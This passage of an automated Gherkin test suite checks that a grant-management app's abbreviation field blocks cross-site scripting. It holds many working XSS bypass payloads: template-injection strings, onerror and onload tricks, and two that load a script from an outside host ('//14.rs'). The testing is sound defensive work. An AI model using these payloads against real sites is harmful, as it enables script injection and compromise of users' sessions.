      | <x :[_b.constructor`alert(1)`()]> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301334 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                             | Field                |
      | <p v-=_c.constructor`alert(1)`()> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301335 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                             | Field                |
      | <x #[_c.constructor`alert(1)`()]> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301336 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                            | Field                |
      | <p :=_c.constructor`alert(1)`()> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301337 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                            | Field                |
      | {{_c.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301348 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                          | Field                |
      | {{_b.constructor`alert(1)`()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301350 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                    | Field                |
      | <x v-bind:is="'script'" src="//14.rs" /> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301351 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                   | Field                |
      | <x is=script src=//⑭.₨> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301352 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                            | Field                |
      | <x @click='_b.constructor`alert(1)`()'>click</x> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301353 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                             | Field                |
      | <x @[_b.constructor`alert(1)`()]> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301364 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                             | Field                |
      | <x :[_b.constructor`alert(1)`()]> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301365 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                             | Field                |
      | <x #[_c.constructor`alert(1)`()]> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301367 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                | Field                |
      | <x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301368 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                     | Field                |
      | <x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301369 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                           | Field                |
      | <xyz<img/src onerror=alert(1)>> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301370 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                | Field                |
      | <svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;</noscript></b></svg> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301388 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                       | Field                |
      | <a @['c\lic\u{6b}']="_c.constructor('alert(1)')()">test</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301391 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                      | Field                |
      | {{$el.ownerDocument.defaultView.alert(1)}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
